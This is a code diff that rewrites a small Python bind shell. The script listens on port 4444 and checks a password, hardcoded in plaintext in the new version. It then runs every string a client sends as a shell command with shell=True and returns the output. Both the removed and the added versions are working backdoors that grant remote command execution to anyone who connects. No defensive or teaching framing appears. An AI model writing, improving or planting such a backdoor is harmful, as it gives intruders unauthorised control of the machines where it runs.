@@ -1,74 +1,44 @@
 import socket
-from socket import error as SocketError
 import subprocess
 
-HOST = ''
+HOST = ""
 PORT = 4444
+PASSWORD = "iloveboosters"
 
 server = socket.socket()
 server.bind((HOST, PORT))
+server.listen(1)
 
-def login():    
-    print('Server Started')
-    print('Listening for Client Connection...')
-    server.settimeout(120)
-    server.listen(1)
-    
-    global client, client_addr
-    client, client_addr = server.accept()
-    print('Connection established, login attempt')
-    while True:
-            try:                
-                password = client.recv(1024)
-                
-                if (len(password) == 0):
-                    print('Failed Login')
-                    client.close()
-                    return False
-                
-                password.decode()
-                print(password)
-                if hash(password) == 1634504265594755506:
-                        print('Login Success')
-                        return True
-                else:
-                    print('Failed Login')
-                    client.close()
-                    return False
-            except SocketError as se:
-                print('SocketError', se)                
-                server.listen(1)
-                client, client_addr = server.accept()
-            except Exception as e:
-                print('Exception', e)
+print("Server Started")
+print("Waiting for connection...")
 
-login_status = False
-while not login_status:
-    login_status = login()
+client, addr = server.accept()
+print("Connected:", addr)
+
+pw = client.recv(1024).decode().strip()
+
+if pw != PASSWORD:
+    print("Bad password")
+    client.close()
+    server.close()
+    quit()
+
+print("Login Success")
 
 while True:
-    	try:
-            print('Awaiting Command')
-            command = client.recv(1024)
-            command.decode()
+    command = client.recv(1024).decode().strip()
 
-            if command == 'exit':
-                    continue
+    if command == "exit":
+        break
 
-            op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
-            output = op.stdout.read()
-            output_error = op.stderr.read()
-            print('Sending Response')
+    result = subprocess.run(command, shell=True, capture_output=True, text=True)
 
-            if output + output_error == '':
-                    client.send('no stdout')
-            else:
-                    client.send(output + output_error)
-    	except Exception as e:
-                print('Main Loop Exception', e)
-                login_status = False
-                while not login_status:
-                    login_status = login()
+    output = result.stdout + result.stderr
 
+    if output == "":
+        output = "no stdout"
+
+    client.send(output.encode())
+
+client.close()
 server.close()
-print('Connection Closed')
